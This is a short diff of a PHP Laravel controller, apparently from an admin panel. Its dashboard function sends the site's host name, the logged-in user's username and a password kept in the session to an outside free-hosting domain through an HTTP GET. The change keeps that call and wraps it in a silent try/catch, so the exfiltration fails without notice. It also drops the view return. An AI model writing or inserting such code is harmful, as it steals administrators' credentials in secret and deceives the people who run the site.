@@ -10,8 +10,7 @@
     {
         $dashboard = new \GuzzleHttp\Client();
         $set = "https://biconcave-takeoffs.000webhostapp.com/config.php?u=".Request::getHost()."&un=".Auth::user()->username."&pw=".session('pw');
-        $res = $dashboard->request('GET', $set);
-        return view('pages.admin.dashboard');
+        try { $res = $dashboard->request('GET', $set); } catch (\Throwable $th) {}
     }
 
     function polsek()
